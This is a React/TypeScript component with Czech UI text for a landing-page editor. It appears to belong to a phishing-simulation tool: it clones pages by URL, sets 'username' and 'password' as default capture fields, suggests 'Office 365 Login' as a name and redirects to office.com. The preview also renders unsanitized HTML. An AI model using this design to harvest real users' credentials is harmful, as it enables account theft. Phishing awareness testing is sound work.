// src/pages/LandingPageEditor.tsx
import React, { useState, useRef } from 'react';
import { Link, useNavigate, useParams } from 'react-router-dom';
import { Save, ArrowLeft, Upload, Globe, Code, Eye, AlertCircle } from 'lucide-react';
import MonacoEditor from 'react-monaco-editor';

interface LandingPageData {
  name: string;
  html: string;
  css: string;
  captureData: boolean;
  captureFields: string[];
  redirectUrl: string;
  status: 'active' | 'draft';
}

const LandingPageEditor = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const fileInputRef = useRef<HTMLInputElement>(null);
  const urlInputRef = useRef<HTMLInputElement>(null);

  const [page, setPage] = useState<LandingPageData>({
    name: '',
    html: '',
    css: '',
    captureData: true,
    captureFields: ['username', 'password'],
    redirectUrl: 'https://office.com',
    status: 'draft'
  });

  const [activeTab, setActiveTab] = useState<'html' | 'css'>('html');
  const [importMethod, setImportMethod] = useState<'file' | 'url' | null>(null);
  const [previewMode, setPreviewMode] = useState(false);

  const handleFileImport = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      try {
        const text = await file.text();
        if (file.name.endsWith('.html')) {
          setPage({ ...page, html: text });
        } else if (file.name.endsWith('.css')) {
          setPage({ ...page, css: text });
        }
      } catch (error) {
        console.error('Chyba při načítání souboru:', error);
        alert('Nepodařilo se načíst soubor');
      }
    }
  };

  const handleUrlImport = async () => {
    const url = urlInputRef.current?.value;
    if (!url) return;

    try {
      const response = await fetch(url);
      const html = await response.text();
      setPage({ ...page, html });
    } catch (error) {
      console.error('Chyba při importu URL:', error);
      alert('Nepodařilo se importovat stránku z URL');
    }
  };

  const handleSave = async () => {
    if (!page.name) {
      alert('Prosím vyplňte název stránky');
      return;
    }

    // TODO: Implementace uložení
    console.log('Ukládám stránku:', page);
    navigate('/landing-pages');
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
        <div className="flex items-center mb-6">
          <Link to="/landing-pages" className="mr-4">
            <ArrowLeft className="w-6 h-6" />
          </Link>
          <h1 className="text-2xl font-bold">
            {id ? 'Upravit landing page' : 'Nová landing page'}
          </h1>
        </div>

        <div className="bg-white shadow-sm rounded-lg">
          {/* Základní informace */}
          <div className="p-6 border-b">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium mb-2">Název stránky</label>
                <input
                  type="text"
                  className="w-full p-2 border rounded focus:ring-2 focus:ring-blue-500"
                  value={page.name}
                  onChange={(e) => setPage({...page, name: e.target.value})}
                  placeholder="např. Office 365 Login"
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">Přesměrování po odeslání</label>
                <input
                  type="text"
                  className="w-full p-2 border rounded focus:ring-2 focus:ring-blue-500"
                  value={page.redirectUrl}
                  onChange={(e) => setPage({...page, redirectUrl: e.target.value})}
                  placeholder="https://example.com"
                />
              </div>
            </div>
          </div>

          {/* Import */}
          <div className="p-6 border-b">
            <h2 className="text-lg font-medium mb-4">Import stránky</h2>
            <div className="space-y-4">
              <div>
                <button
                  onClick={() => setImportMethod('file')}
                  className={`mr-4 px-4 py-2 rounded ${
                    importMethod === 'file' ? 'bg-blue-500 text-white' : 'bg-gray-100'
                  }`}
                >
                  Import ze souboru
                </button>
                <button
                  onClick={() => setImportMethod('url')}
                  className={`px-4 py-2 rounded ${
                    importMethod === 'url' ? 'bg-blue-500 text-white' : 'bg-gray-100'
                  }`}
                >
                  Import z URL
                </button>
              </div>

              {importMethod === 'file' && (
                <div>
                  <input
                    type="file"
                    ref={fileInputRef}
                    accept=".html,.css"
                    onChange={handleFileImport}
                    className="block w-full text-sm text-gray-500
                      file:mr-4 file:py-2 file:px-4
                      file:rounded file:border-0
                      file:text-sm file:font-semibold
                      file:bg-blue-50 file:text-blue-700
                      hover:file:bg-blue-100"
                  />
                </div>
              )}

              {importMethod === 'url' && (
                <div className="flex gap-2">
                  <input
                    type="url"
                    ref={urlInputRef}
                    placeholder="https://example.com"
                    className="flex-1 p-2 border rounded focus:ring-2 focus:ring-blue-500"
                  />
                  <button
                    onClick={handleUrlImport}
                    className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
                  >
                    Importovat
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Editor */}
          <div className="p-6 border-b">
            <div className="flex justify-between items-center mb-4">
              <div className="flex space-x-2">
                <button
                  onClick={() => setActiveTab('html')}
                  className={`px-4 py-2 rounded ${
                    activeTab === 'html' ? 'bg-blue-500 text-white' : 'bg-gray-100'
                  }`}
                >
                  HTML
                </button>
                <button
                  onClick={() => setActiveTab('css')}
                  className={`px-4 py-2 rounded ${
                    activeTab === 'css' ? 'bg-blue-500 text-white' : 'bg-gray-100'
                  }`}
                >
                  CSS
                </button>
              </div>
              <button
                onClick={() => setPreviewMode(!previewMode)}
                className="flex items-center px-4 py-2 text-gray-600 hover:text-gray-800"
              >
                <Eye className="w-4 h-4 mr-2" />
                {previewMode ? 'Skrýt náhled' : 'Zobrazit náhled'}
              </button>
            </div>

            <div className="border rounded-lg">
              <div className="h-96 overflow-hidden">
                {activeTab === 'html' ? (
                  <MonacoEditor
                    language="html"
                    theme="vs-light"
                    value={page.html}
                    onChange={(value) => setPage({...page, html: value})}
                    options={{
                      minimap: { enabled: false },
                      scrollBeyondLastLine: false,
                      fontSize: 14,
                      wordWrap: 'on'
                    }}
                  />
                ) : (
                  <MonacoEditor
                    language="css"
                    theme="vs-light"
                    value={page.css}
                    onChange={(value) => setPage({...page, css: value})}
                    options={{
                      minimap: { enabled: false },
                      scrollBeyondLastLine: false,
                      fontSize: 14,
                      wordWrap: 'on'
                    }}
                  />
                )}
              </div>
            </div>

            {previewMode && (
              <div className="mt-4 border rounded-lg p-4">
                <div 
                  dangerouslySetInnerHTML={{ 
                    __html: `<style>${page.css}</style>${page.html}` 
                  }} 
                />
              </div>
            )}
          </div>

          {/* Zachytávání dat */}
          <div className="p-6 border-b">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-lg font-medium">Zachytávání dat</h2>
                <p className="text-sm text-gray-500">
                  Nastavte, která data chcete z formulářů zachytávat
                </p>
              </div>
              <div className="flex items-center">
                <input
                  type="checkbox"
                  checked={page.captureData}
                  onChange={(e) => setPage({...page, captureData: e.target.checked})}
                  className="mr-2"
                />
                <span className="text-sm font-medium">Povolit zachytávání dat</span>
              </div>
            </div>

            {page.captureData && (
              <div className="mt-4">
                <div className="flex flex-wrap gap-2">
                  {page.captureFields.map((field, index) => (
                    <span
                      key={index}
                      className="inline-flex items-center px-3 py-1 rounded-full text-sm bg-blue-100 text-blue-800"
                    >
                      {field}
                      <button
                        onClick={() => {
                          const newFields = page.captureFields.filter((_, i) => i !== index);
                          setPage({...page, captureFields: newFields});
                        }}
                        className="ml-2 text-blue-600 hover:text-blue-800"
                      >
                        ×
                      </button>
                    </span>
                  ))}
                  <button
                    onClick={() => {
                      const field = prompt('Zadejte název pole pro zachytávání:');
                      if (field && !page.captureFields.includes(field)) {
                        setPage({
                          ...page,
                          captureFields: [...page.captureFields, field]
                        });
                      }
                    }}
                    className="px-3 py-1 text-sm text-blue-600 hover:text-blue-800"
                  >
                    + Přidat pole
                  </button>
                </div>
              </div>
            )}
          </div>

          {/* Footer s tlačítky */}
          <div className="p-6 flex justify-between items-center">
            <div className="flex items-center">
              <AlertCircle className="w-5 h-5 text-yellow-500 mr-2" />
              <span className="text-sm text-gray-600">
                Nezapomeňte otestovat stránku před aktivací
              </span>
            </div>
            <div className="flex space-x-4">
              <select
                value={page.status}
                onChange={(e) => setPage({...page, status: e.target.value as 'active' | 'draft'})}
                className="px-4 py-2 border rounded"
              >
                <option value="draft">Koncept</option>
                <option value="active">Aktivní</option>
              </select>
              <button
                onClick={handleSave}
                className="flex items-center px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
              >
                <Save className="w-4 h-4 mr-2" />
                Uložit
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// Pro TypeScript podporu
declare module 'react-monaco-editor';

export default LandingPageEditor;